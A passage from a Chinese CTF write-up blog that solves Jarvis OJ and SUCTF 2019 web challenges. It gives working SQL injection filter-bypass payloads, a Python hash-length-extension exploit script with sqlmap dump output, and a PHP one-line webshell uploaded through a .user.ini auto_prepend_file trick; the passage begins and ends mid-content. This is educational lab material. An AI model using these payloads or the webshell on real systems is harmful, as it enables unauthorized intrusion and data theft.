invoke__">substr</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)<br>    &#123;<br>        <span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;work harder!harder!harder!&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>易得需要 get 传参 <code>id</code>, <code>a</code>, <code>b</code> ，并且满足源码中的判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 当然首先是要有 id 参数且不能为 0，然后看到第一个 if 函数</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;.&#x27;</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hahahahahaha&#x27;</span>;<br><span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-comment">// 这里对 $a 进行了判断，参数 a 里面不允许含有 &#x27;.&#x27;</span><br><br><span class="hljs-variable">$data</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-comment">// 接下来这个函数，file_get_contents() 的作用是把整个文件读入一个字符串中</span><br><span class="hljs-comment">// 在 ctf 中一般结合 php 伪协议运用</span><br><span class="hljs-comment">// 因此 $data = php://input ,然后在 post data 里面加入 &quot;1112 is a nice lab!&quot;</span><br><br><span class="hljs-variable">$id</span> == <span class="hljs-number">0</span><br><span class="hljs-comment">// 因为开头的判断使得 id 不能为 0，但这里要验证 id 的值要等于 0，这里是 php 两个等于号</span><br><span class="hljs-comment">// php 中 == 只是比较两个数的值是否相等，0a == 0 会把0a解析成0来绕过验证（0后加任意字符串，此时id会被识别为字符串，当做比对的时候取前面数字部分，也就是0）</span><br>    <br><span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$b</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;111&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;1114&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>;<br><span class="hljs-comment">// b参数的长度要大于5,并且在第二个参数里搜索，&quot;111&quot;加上b的第一个字符（第一个参数），也就是第二个参数包含第一个参数就可以，这里我们用到%00进行截断，因此&quot;111%00&quot;会被解析成&quot;111&quot;，字符串结束，同时第一个字符不能是4,所以我们这里赋值$b=%00111111</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/1gv4UA.jpg" alt="1gv4UA.jpg"></p><p>看起来像一个url，我们访问得到新页面：</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvoCt.jpg" alt="1gvoCt.jpg"></p><p>可以看到，url上自动加上了id参数，猜测是sql注入</p><p>经 fuzz，发现空格被过滤，使用 <code>/*1*/</code>可以绕过，关键字可以采用双写绕过</p><p>值得注意的是，这里是int型注入，不需要添加单引号</p><p>测试注入点：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">/*1*/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span># # 回显正常<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">/*1*/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span># # 回显错误<br></code></pre></td></tr></table></figure><p>用order by等进行字段数查询，这里我直接猜测3，带有运气成分</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/*1*/</span>uniounionn<span class="hljs-comment">/*1*/</span>seselectlect<span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p>页面回显3，因此我们利用3这个列来进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/*1*/</span>uniounionn<span class="hljs-comment">/*1*/</span>seselectlect<span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-comment">/*1*/</span>frfromom<span class="hljs-comment">/*1*/</span>information_schema.tables<span class="hljs-comment">/*1*/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/*1*/</span>table_schema<span class="hljs-operator">=</span>database()#<br></code></pre></td></tr></table></figure><p>页面返回<code>content</code>，只有一个表，继续查询列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/*1*/</span>uniounionn<span class="hljs-comment">/*1*/</span>seselectlect<span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name)<span class="hljs-comment">/*1*/</span>frfromom<span class="hljs-comment">/*1*/</span>information_schema.columns<span class="hljs-comment">/*1*/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/*1*/</span>table_name<span class="hljs-operator">=</span><span class="hljs-number">0x636f6e74656e74</span>#<br></code></pre></td></tr></table></figure><p>这里因为对表名<code>content</code>进行了过滤，所以我们换成十六进制即可绕过</p><p>网页回显 <code>id</code>，<code>context</code>，<code>title</code>三个列名，flag在<code>context</code>里，查询可得</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/*1*/</span>uniounionn<span class="hljs-comment">/*1*/</span>seselectlect<span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,context<span class="hljs-comment">/*1*/</span>frfromom<span class="hljs-comment">/*1*/</span>content#<br></code></pre></td></tr></table></figure><h1 id="flag-在管理员手里"><a href="#flag-在管理员手里" class="headerlink" title="flag 在管理员手里"></a>flag 在管理员手里</h1><p>Description：</p><blockquote><p>只有管理员才能获得flag，你能想办法获得吗？</p><p><code>link：http://web.jarvisoj.com:32778/</code></p></blockquote><p>打开题目环境，看见 <code>Only Admin can see the flag!!</code></p><p>查看源代码无果，分析一下数据包，f12&#x2F;bp走起，可以注意到：</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvT8P.jpg" alt="1gvT8P.jpg"></p><p><code>role=s%3A5%3A%22guest%22%3B</code></p><p><code>hsh=3a4727d57463f122833d9e732f94e4e0</code></p><p>抓包把 <code>role</code>改成admin发现并没有什么用，那应该跟hsh（猜测是hash值）有关</p><p>先用<code>dirsearch</code>扫一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  dirsearch git:(master) python3 dirsearch.py -u http://web.jarvisoj.com:32778 -e *<br></code></pre></td></tr></table></figure><p>发现有源码泄漏<code>index.php~</code></p><p><img src="https://s2.ax1x.com/2020/02/07/1gv7gf.jpg" alt="1gv7gf.jpg"></p><p>访问<code>index.php~</code>把文件下下来，进行代码审计。</p><p>这里有一点，下载下来格式是非常乱的，因此我们要先把<code>index.php~</code>改名为<code>.index.php.bak</code></p><p>然后执行 <code>vim -r index.php</code>进行恢复，获得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$auth</span> = <span class="hljs-literal">false</span>; <br><span class="hljs-variable">$role</span> = <span class="hljs-string">&quot;guest&quot;</span>; <br><span class="hljs-variable">$salt</span> =  <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;role&quot;</span>])) &#123; <br><span class="hljs-variable">$role</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;role&quot;</span>]); <br> <span class="hljs-variable">$hsh</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;hsh&quot;</span>]; <br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$role</span>===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$hsh</span> === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;role&quot;</span>]))) &#123; <br> <span class="hljs-variable">$auth</span> = <span class="hljs-literal">true</span>; <br> &#125; <span class="hljs-keyword">else</span> &#123; <br> <span class="hljs-variable">$auth</span> = <span class="hljs-literal">false</span>; <br> &#125; <br> &#125; <span class="hljs-keyword">else</span> &#123; <br> <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$role</span>); <br> <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;role&#x27;</span>,<span class="hljs-variable">$s</span>); <br> <span class="hljs-variable">$hsh</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$s</span>)); <br> <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;hsh&#x27;</span>,<span class="hljs-variable">$hsh</span>); <br> &#125; <br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auth</span>) &#123; <br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Welcome Admin. Your flag is  </span><br><span class="hljs-string"> &#125; else &#123; </span><br><span class="hljs-string"> echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="hljs-string">&quot;; </span><br><span class="hljs-string"> &#125; </span><br></code></pre></td></tr></table></figure><p>这里的hsh是加盐md5，不难想到是hash长度扩展攻击</p><p><strong>了解哈希长度扩展攻击</strong></p><p>哈希长度扩展攻击适用于加密情况为：<code>hash($SECRET, $message)</code>的情况，其中 hash 最常见的就是 md5、hash1。我们可以在不知道<code>$SECRET</code>的情况下推算出另外一个匹配的值。如上例所给的 PHP 代码：</p><ul><li>我们知道<code>md5($SECRET . strrev($_COOKIE[&quot;auth&quot;]))</code>的值</li><li>我们知道<code>$hsh</code>的值</li><li>我们可以算出另外一个 md5 值和另外一个 $hsh 的值，使得 <code>$hsh == md5($SECRET . strrev($_COOKIE[&quot;auth&quot;]))</code></li></ul><p>这样即可通过验证。 </p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">第一个条件 $role===<span class="hljs-string">&quot;admin&quot;</span><br>只需要使$role参数的前<span class="hljs-number">5</span>个字符是<span class="hljs-string">&quot;admin&quot;</span>，第六个字符是<span class="hljs-string">&#x27;\0&#x27;</span>即可。<br>第二个条件 $hsh === md5($salt.strrev($_COOKIE[<span class="hljs-string">&quot;role&quot;</span>]))<br>注意和$salt连接的字符串是经过strrev函数处理的role参数，只需要构造role参数的后半部分，通过hash长度扩展攻击，经过运算得到新的hsh即可。$salt的长度暂时不知道，暂时输入一个数字<span class="hljs-number">10</span>，得到新的hash值fcdc3840332555511c4e4323f6decb07以及一个接近payload的字符串;<span class="hljs-string">&quot;tseug&quot;</span>:<span class="hljs-number">5</span>:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0\x00\x00\x00\x00\x00\x00\x00;<span class="hljs-string">&quot;nimda&quot;</span>:<span class="hljs-number">5</span>:s。\xb0说明$salt+;<span class="hljs-string">&quot;tseug&quot;</span>:<span class="hljs-number">5</span>:s一共<span class="hljs-number">176</span>bit，也就是<span class="hljs-number">22</span>字节，$salt长假设是<span class="hljs-number">10</span>字节。<br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs coq">hash_extender：<br>已知hash&#123;secret(已知长度)&#125;，求hash&#123;secret (已知长度)|<span class="hljs-type">| data</span> (填充字段）|<span class="hljs-type">| attacker_controlled_data</span>（自定义字符串）&#125;<br>hashpumpy：<br>hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)<br>本题：已知md5(secret(未知长度）+string1)，求md5&#123;secret|<span class="hljs-type">|%00</span>等填充字段|<span class="hljs-type">|2string</span>&#125;<br>最大的不同就是不知道salt长度！古话说的好，爆破就是艺术，这题应该不会难为我们，从<span class="hljs-number">0</span><span class="hljs-number">-15</span>爆破。<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> requests,hashpumpy,urllib<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(): <span class="hljs-comment">#py2</span><br>    url = <span class="hljs-string">&#x27;http://web.jarvisoj.com:32778/&#x27;</span><br>    sha = <span class="hljs-string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span><br>    string0 = <span class="hljs-string">&#x27;;&quot;tseug&quot;:5:s&#x27;</span><br>    string1 = <span class="hljs-string">&#x27;;&quot;nimda&quot;:5:s&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>        digest, message = hashpumpy.hashpump(sha,string0,string1,i)<br>        payload =&#123;<span class="hljs-string">&#x27;role&#x27;</span>:urllib.quote(message[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;hsh&#x27;</span>:digest&#125;<br>        <span class="hljs-built_in">print</span> i,payload<br>        html = requests.get(url,cookies=payload).text<span class="hljs-comment">#提交答案</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Welcome&#x27;</span> <span class="hljs-keyword">in</span> html:<br>            index = html.find(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>            edge = html.find(<span class="hljs-string">&#x27;&lt;/h3&gt;&#x27;</span>)<br>    message = html[index:edge]<br>    <span class="hljs-built_in">print</span>(message)<br>    exit()<br>exploit()<br></code></pre></td></tr></table></figure><p>hash-length-extension-attacks : </p><p><code>https://en.wikipedia.org/wiki/Length_extension_attack</code></p><p><code>https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks</code></p><p>p神的blog : </p><p><code>https://www.cnblogs.com/pcat/p/5478509.html</code></p><p>另外，只有<code>salt</code>在前，<code>value</code>在后，才可使用 Hash长度扩展攻击。</p><h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><p>Description：</p><blockquote><p>很简单的注入，大家试试？</p><p><code>link：http://web.jarvisoj.com:32787/</code></p><p>source：ISCC2016</p></blockquote><p>打开是一个登录框，输入 admin 进行 Fuzz，显示密码错误</p><p>接着输入 admin’ ，提示用户名错误。</p><p>经多次测试，发现对空格进行了过滤，并且可以用 <code>/**/</code> 进行绕过。</p><p>对关键字貌似并没有过滤，至少不影响本次做题，因此我们可以直接用 sqlmap 跑</p><p>因为是 Post ，我们用 Burpsuite 抓包后，存为 txt 文件，然后使用 -r 进行读取</p><p>并且我们知道空格用 <code>/**/</code> 绕过，并且注入点在 <code>username</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sqlmap -r 1.txt --tamper=space2comment -p username</span> <br></code></pre></td></tr></table></figure><p>这题是盲注，Time-based 和 Bool-Based 都可以，取决于写脚本的方式</p><p>回显：</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvHv8.jpg" alt="1gvHv8.jpg"></p><p>接下来读取数据库：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># sqlmap -r 1.txt --tamper=space2comment -p username --dbs </span><br><br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">52</span>] [<span class="hljs-type">INFO</span>] the back<span class="hljs-literal">-end</span> DBMS is MySQL<br>web application technology: PHP <span class="hljs-number">5.6</span>.<span class="hljs-number">21</span>, Apache <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span><br>back<span class="hljs-literal">-end</span> DBMS: MySQL &gt;= <span class="hljs-number">5.0</span>.<span class="hljs-number">12</span><br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">52</span>] [<span class="hljs-type">INFO</span>] fetching database names<br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">52</span>] [<span class="hljs-type">INFO</span>] fetching number of databases<br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">53</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-number">3</span><br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">53</span>] [<span class="hljs-type">INFO</span>] resumed: information_schema<br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">53</span>] [<span class="hljs-type">INFO</span>] resumed: injection<br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">53</span>] [<span class="hljs-type">INFO</span>] resumed: test<br>available databases [<span class="hljs-number">3</span>]:<br>[*] information_schema<br>[*] injection<br>[*] test<br></code></pre></td></tr></table></figure><p>我们猜测 <code>injection</code> 表，查询 <code>tables</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sqlmap -r 1.txt --tamper=space2comment -p username -D injection --tables</span>      <br><br>web application technology: PHP 5.6.21, Apache 2.4.18<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[17:31:53] [INFO] fetching tables for database: &#x27;injection&#x27;<br>[17:31:53] [INFO] fetching number of tables for database &#x27;injection&#x27;<br>[17:31:53] [INFO] resumed: 1<br>[17:31:53] [INFO] resumed: admin<br>Database: injection<br>[1 table]<br>+-------+<br>| admin |<br>+-------+<br><br></code></pre></td></tr></table></figure><p>查询 <code>columns</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sqlmap -r 1.txt --tamper=space2comment -p username -D injection -T admin --columns</span><br><br>web application technology: PHP 5.6.21, Apache 2.4.18<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[17:33:26] [INFO] fetching columns for table &#x27;admin&#x27; in database &#x27;injection&#x27;<br>[17:33:26] [INFO] resumed: 3<br>[17:33:26] [INFO] resumed: id<br>[17:33:26] [INFO] resumed: int(11)<br>[17:33:26] [INFO] resumed: username<br>[17:33:26] [INFO] resumed: varchar(255)<br>[17:33:26] [INFO] resumed: password<br>[17:33:26] [INFO] resumed: varchar(255)<br>Database: injection<br>Table: admin<br>[3 columns]<br>+----------+--------------+<br>| Column   | Type         |<br>+----------+--------------+<br>| id       | int(11)      |<br>| password | varchar(255) |<br>| username | varchar(255) |<br>+----------+--------------+<br></code></pre></td></tr></table></figure><p>看到有三个字段 <code>id</code>, <code>username</code> , <code>password</code> , 直接 dump 出来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sqlmap -r 1.txt --tamper=space2comment -p username -D injection -T admin -C <span class="hljs-string">&quot;id,username,password&quot;</span> --dump</span><br><br>Database: injection<br>Table: admin<br>[1 entry]<br>+----+----------+----------------------------------+<br>| id | username | password                         |<br>+----+----------+----------------------------------+<br>| 1  | admin    | 334cfb59c9d74849801d5acdcfdaadc3 |<br>+----+----------+----------------------------------+<br></code></pre></td></tr></table></figure><p>我们得到 admin 的密码，看样子是一个 md5 的值，我们上网搜一下，得到结果 <code>eTAloCrEP</code></p><p>登录 admin 和密码直接登录，得到 flag</p><h1 id="To-be-continue…"><a href="#To-be-continue…" class="headerlink" title="To be continue…"></a>To be continue…</h1>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web WriteUps for SUCTF2019</title>
    <link href="/2019/08/26/SUCTF2019_WriteUp/"/>
    <url>/2019/08/26/SUCTF2019_WriteUp/</url>
    
    <content type="html"><![CDATA[<h1 id="SUCTF-2019"><a href="#SUCTF-2019" class="headerlink" title="SUCTF 2019"></a>SUCTF 2019</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>题目是一个文件上传的题目，</p><p>先随便上传一个马上去，发现显示：<br><img src="https://s2.ax1x.com/2020/02/12/17nPH0.png" alt="17nPH0.png"></p><p>猜测使用了 <code>exif_imagetype()</code> 函数，这样我们可以加文件头如 <code>GIF89a</code> 即可绕过。</p><p>然后再上传个图片马，一句话为 <code>&lt;?php @eval($_POST[hz]);?&gt;</code>，发现提示：</p><p><img src="https://s2.ax1x.com/2020/02/12/17nFEV.png" alt="17nFEV.png"></p><p>也就是过滤了 <code>&lt;?</code>，我们换<code>script</code>马<code>&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[hz]);&lt;/script&gt;</code>，上传成功了。</p><p><img src="https://s2.ax1x.com/2020/02/12/17nkNT.png" alt="17nkNT.png"></p><p>并且告诉我们上传的路径，我们访问图片发现又是一个上传界面，我们注意到上传文件夹中包含 <code>index.php</code>，且这里是 <code>nginx</code> ，可以上传 <code>.user.ini</code>，来设置解析，什么是<code>.user.ini</code>？见<a href="http://www.vuln.cn/6001">参考资料</a>，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p><p>所以我们写一个 <code>.user.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">GIF89a<br><span class="hljs-attr">auto_prepend_file</span>=shell.gif<br></code></pre></td></tr></table></figure><p>写了文件头，上传成功。接下来我们写一个名为 <code>shell.gif</code> 的图片马，上传上去，我们同样用 <code>script</code> 马，上传后，直接访问 <code>uploads/xxxxxxxxxxxxxxx/index.php?system(&#39;cat /flag&#39;);</code>即可得到 flag。</p><h2 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>():<br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span><br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))<br>    host = parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host<br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    <span class="hljs-comment">#去掉 url 中的空格</span><br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span><br></code></pre></td></tr></table></figure><p>本地大概理了一下代码功能 <code>url=http://suctf.ccc/?id=1#123</code></p><p><img src="https://s2.ax1x.com/2020/02/12/17ndbt.png" alt="17ndbt.png"></p><p>通过源码分析可以知道大概的思路是利用 <code>file://</code> 去读文件，同时hostname不能是<code>suctf.cc</code>，然后注意到<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>，在github上有一篇东西。</p><blockquote><p><a href="https://github.com/python-hyper/hyperlink/issues/19">https://github.com/python-hyper/hyperlink/issues/19</a></p></blockquote><p>上面的字符可以代表 